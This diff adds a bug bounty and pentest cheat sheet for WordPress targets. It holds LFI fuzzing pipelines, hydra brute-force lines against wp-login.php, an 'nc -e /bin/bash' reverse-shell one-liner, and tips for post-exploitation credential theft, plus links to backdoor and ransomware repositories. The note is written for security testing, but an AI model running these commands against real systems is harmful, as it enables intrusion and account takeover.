@@ -1,0 +1,259 @@
+##### FFUF for Bug Bounty Hunting:
+
+echo www.abc.xyz | waybackurls | gf lfi | urldedupe
+python lfi.py --urls urls.txt --payloads lfi_wordlist.txt -s 
+* You will find parameter then you can bruteforce via 2 ways burpsuite or ffuf.
+ffuf -request req.txt -request-proto https -w /usr/share/payloads/lfi.txt -c -mr "root:"
+
+LFI Finder:
+https://github.com/capture0x/LFI-FINDER
+https://gist.github.com/six2dez/a89a0c7861d49bb61a09822d272d5395
+
+
+##### Extract Manually:
+subfinder -d www.abc.xyz | httpx | gau | uro | gf lfi | tee x.txt
+waymore -i "www.abc.xyz" -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read urls; do ffuf -u $urls -w payload/lfi.txt -c -mr "root:" -v; done
+waymore -i "www.abc.xyz" -n -mode U | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read -r urls; do ffuf -u "$urls" -w payload/lfi.txt -c -mr "root:" -v; done
+paramspider -d www.abc.xyz --subs 
+python paramspider.py --url "http://example.com" | gf lfi | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | while read -r url; do ffuf -u "$url" -w payloads/lfi.txt -mr "root:" -c; done
+
+##### Easy way to find wordpress file upload Vulnerability:
+use wappalyzer, shodan, wpscan, nslookup, dig, whois, ping, host
+
+Wordpress Enum:
+-> Wordpress Check : burp, nmap, ffuf, nuclei, wpscan
+-> Extra Commands
+-> WpScan OneLiners
+-> Plugin and theme Exploitation
+-> Oneliner
+-> nmap
+-> CVE 2024-3495, CVE 2022-35489, CVE-2023-23488
+
+--> Extra Commands
+* check robots.txt, wordress/robots.txt
+* if you find domain add it to /etc/hosts
+* check /wordpress/wp-login.php
+* if you have access to control panel, you can copy paste the password hash of a previously pwd user into another user
+* if wpteam is installed, basically a mock terminal just fire off a reverse shell to kali
+	nc -e /bin/bash 10.10.10.10 123
+	nc -nvlp 1234
+* if you access to the dashboard, check: tools > site heath > info
+* Post exploit: cd /var/www/html
+* check wp-cnofig.php
+* hydra -l admin -P pass.txt > $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log in&testcookie=1;S=Location'
+  hydra -l admin -P pass.txt 10.10.192.106 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&testcookie=1:The password you entered for the username"
+
+-> WpScan OneLiners
+sudo wpscan --url abc.xyz/wordpress/ -e u
+sudo wpscan --url abc.xyz/wordpress/ --usernames admin --passwords /usr/share/wordlists/dirb/big.txt
+sudo wpscan --url abc.xyz/wordpress/ --enumerate ap,at,cb,dbe -o wpscan.txt 
+wpscan --disable-tls-checks --url abc.xyz/wordpress/ --enumerate ap --plugins-detection 
+wpscan --disable-tls-checks --url abc.xyz/wordpress/ -e u 
+
+-> Nmap
+nikto -h domain --ssl
+nmap --script http-wordpress-brute ip
+nmap --script http-wordpress-enum --script-args type="plugins",search-limit=1500 -p 80 ip
+nmap --script http-wordpress-users -p 80 ip
+nmap --script http-wordpress-* -p 80 ip
+
+-> Common Directories
+/author/admin
+/index.php/author/admin
+/licence.txt
+/readme.html
+/robots.txt
+/wp-admin
+/wp-admin/admin-ajax.php
+/wp-uploads
+/wp-json/wp/1/
+/wp-json/wp/2/
+/wp-login.php
+
+/?author=1
+/?author=2
+
+/?static=1
+
+--> Wordpress Oneliner:
+
+-> Engagement Tools > [search/Find Comment/Find Script/Find Reference/Analysis target/Discover Content]
+
+Scan for vulnerabilities: nmap -p 80,443 --script http-vuln* yourwordpresssite.com
+
+Enumerate WordPress plugins: curl -s yourwordpresssite.com/wp-content/plugins/ | grep -oP 'plugin-name/.*?\.php'
+
+Check for admin users: curl -s yourwordpresssite.com/wp-json/wp/v2/users | jq '.[] | select(.roles | contains(["administrator"]))'
+
+Brute-force login attempts: hydra -l admin -P /path/to/wordlist.txt yourwordpresssite.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Incorrect"
+
+Find installed themes: curl -s yourwordpresssite.com/wp-content/themes/ | grep -oP 'href=".*?"' | grep -v "http"
+
+Check for outdated plugins: curl -s yourwordpresssite.com/wp-admin/plugins.php | grep "update-message"
+
+View directory listing: curl -s yourwordpresssite.com/wp-content/uploads/ | grep -oP 'href=".*?/"'
+
+Check for XML-RPC vulnerability: curl -s -X POST yourwordpresssite.com/xmlrpc.php -d '<methodCall><methodName>pingback.ping</methodName></methodCall>'
+
+Identify user enumeration: curl -s -d "log=admin&pwd=wrongpassword" yourwordpresssite.com/wp-login.php
+
+Look for backups: curl -s yourwordpresssite.com/wp-content/uploads/ | grep -E '\.zip|\.tar|\.gz|\.sql'
+
+
+For XSS:
+https://xss.bughunter.app/
+https://bxsshunter.com/
+https://xss.report/
+
+CheckList:
+https://infosecwriteups.com/mastering-wordpress-penetration-testing-a-step-by-step-guide-d99a06487486
+https://github.com/gruz0/wordpress-checklist
+https://freedium.cfd/https://medium.com/@jasonjayjacobs/a-quick-run-of-pentesting-wordpress-sites-1026d233ea36
+https://github.com/pentesterzone/pentest-checklists/blob/master/CMS/WordPress-Checklist.md
+https://github.com/foysalhossain12/Hacking-Wordpress
+
+Exploits:
+https://github.com/prok3z/Wordpress-Exploits
+
+
+Oneliner:
+https://github.com/0xPugal/One-Liners
+https://github.com/bhavesh-pardhi/One-Liner
+https://github.com/dwisiswant0/awesome-oneliner-bugbounty
+https://github.com/twseptian/oneliner-bugbounty
+https://github.com/thecybertix/One-Liner-Collections
+https://github.com/dwisiswant0/awesome-oneliner-bugbounty
+https://github.com/emadshanab/Oneliner-Bug-Bounty-Collection
+https://github.com/tamimhasan404/Oneliner404
+
+Bug Hunting Method:
+https://github.com/WadQamar10/My-Hunting-Methodology-/blob/main/My%20Bug%20Hunting%20Methodology.md
+https://github.com/ManasHarsh/Bug-bounty-methodology
+https://github.com/Tikam02/Bug-Bounty-Resources
+https://github.com/m0chan/BugBounty/
+https://github.com/mrvcoder/Bug-Hunting-methodologies
+https://medium.com/@Aacle/list/bugbounty-methodology-checklists-a9631229d796
+https://github.com/trilokdhaked/Bug-Bounty-Methodology
+
+Bug Hunting + CTF:
+https://github.com/foysalhossain12/awesome-ctf-crypto
+https://github.com/foysalhossain12/awesome-ctf?tab=readme-ov-file#web-1
+https://github.com/foysalhossain12/Burp-Suite
+https://github.com/foysalhossain12/check-list?tab=readme-ov-file#Single_domain
+https://github.com/foysalhossain12/command-injection-payload-list
+https://github.com/foysalhossain12/Fast-Google-Dorks-Scan
+https://github.com/foysalhossain12/Hacking-Wordpress
+https://github.com/foysalhossain12/hackingtool
+https://github.com/foysalhossain12/How-to-create-Web-CTF-Challenges
+https://github.com/foysalhossain12/john-the-ripper
+https://github.com/foysalhossain12/Python_For_Cyber
+https://github.com/foysalhossain12/Steganography
+https://github.com/foysalhossain12/Steganography-_CTF
+https://github.com/foysalhossain12/Web-Vulnerabilites
+https://github.com/foysalhossain12/window-rat
+https://github.com/foysalhossain12/writeups
+https://github.com/foysalhossain12/xxe-injection-payload-list
+https://github.com/cyberteach360/Bug-Bounty-Methodology
+
+Bug Hunting + CTF + Hacking:
+
+https://github.com/mrco24/OK-VPS
+https://github.com/mrco24/mrco24-wordlist
+https://github.com/mrco24/json-downlod
+https://github.com/mrco24/PH-Recon
+https://github.com/mrco24/time-sql
+https://github.com/mrco24/H-sql
+https://github.com/mrco24/web-archive
+https://github.com/mrco24/mrco24-error-sql
+https://github.com/mrco24/parameters
+https://github.com/mrco24/url-sp
+https://github.com/mrco24/mrco24-blaind_sql
+https://github.com/mrco24/cms
+https://github.com/mrco24/mrco24-lfi
+https://github.com/mrco24/Patterns
+https://github.com/mrco24/fuzz.sh
+https://github.com/mrco24/mrcosqli
+
+https://github.com/thenurhabib/wphunter
+https://github.com/thenurhabib/collector
+https://github.com/thenurhabib/s4sScanner
+https://github.com/thenurhabib/openredscan
+https://github.com/thenurhabib/r3con
+https://github.com/thenurhabib/ransomware
+https://github.com/thenurhabib/domdell
+https://github.com/thenurhabib/vulscanpro
+https://github.com/thenurhabib/topscan
+https://github.com/thenurhabib/dirsfind
+https://github.com/thenurhabib/thenetrecon
+https://github.com/thenurhabib/scancss
+https://github.com/thenurhabib/fstscan
+https://github.com/thenurhabib/subnum
+https://github.com/thenurhabib/subxtor
+https://github.com/thenurhabib/hg
+https://github.com/thenurhabib/linkext
+https://github.com/thenurhabib/intelie
+https://github.com/thenurhabib/tenssens
+https://github.com/thenurhabib/whoisss
+
+https://github.com/lutfumertceylan/top25-parameter
+https://github.com/OWASP/www-project-top-25-parameters
+
+
+
+
+
+https://github.com/robotshell/magicRecon
+https://www.youtube.com/@haxshadow7/videos
+
+
+
+https://github.com/HolyBugx/HolyTips
+https://github.com/devanshbatham/Awesome-Bugbounty-Writeups
+https://github.com/ZeoRexDevs/Udeler_GUI
+https://github.com/MrUnknownNoob/subdomainfinder
+https://github.com/fatinsourav/Recon-Techniques
+https://github.com/1337r0j4n/php-backdoors
+https://github.com/rijans/.NET-Framework-3.5-Offline-Installer
+https://github.com/imran-parray/Mind-Maps
+https://github.com/NafisiAslH/KnowledgeSharing
+https://github.com/daffainfo/AllAboutBugBounty
+https://github.com/Az0x7/vulnerability-Checklist
+https://github.com/AlbusSec/Penetration-List
+https://github.com/trilokdhaked/Bug-Bounty-Methodology
+https://github.com/six2dez/pentest-book
+https://github.com/riramar/Web-Attack-Cheat-Sheet
+https://github.com/Edr4/XSS-Bypass-Filters
+https://github.com/sajjadium/ctf-archives
+https://github.com/Proviesec/google-dorks
+https://github.com/Astrosp/Awesome-OSINT-For-Everything
+https://github.com/satoki/ctf_writeups
+https://github.com/daffainfo/ctf-writeup
+https://github.com/Abends2/CTFs_and_Hackatons__WriteUps
+https://github.com/edoardottt/awesome-hacker-search-engines
+https://github.com/Ignitetechnologies/Mindmap
+
+
+##### Time Based 𝗦𝗤𝗟 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 on 𝐰𝐨𝐫𝐝𝐩𝐫𝐞𝐬𝐬:
+
+-> use spyhunt to find subdomain
+-> use httpx to probe live subdomain
+-> use nmap to see what poth are open
+-> use wpscan to find out more about
+-> use burp to find
+-> run nuclei tool more info
+
+python3 spyhunt.py -s abc.xyz
+nslookup abc.xyz
+cat subdomain.txt | httpx -sc -td <ip>
+nmap -A <ip>
+nmap -p8443 -sC <ip>
+wpscan --url abc.xyz --enumerate --random-user-agent
+nmap -sV --script=ssh* -p22 ip
+
+
+
+
+
+
+
+
